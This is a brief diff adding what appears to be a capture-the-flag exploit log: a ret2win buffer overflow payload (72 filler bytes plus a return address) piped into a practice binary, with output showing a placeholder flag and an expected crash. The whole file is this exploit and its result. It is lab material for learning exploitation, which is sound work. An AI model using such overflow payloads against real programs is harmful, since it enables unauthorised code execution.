@@ -1,0 +1,7 @@
+$ ./ld-linux-x86-64.so.2 --library-path . ./warmy  < payload(A*0x48 + p64(0x401236))
+
+Hola! 
+
+The Flag: KaliTeam{fake_flag}
+
+(exit 139 after win returns is expected: ret lands on junk)
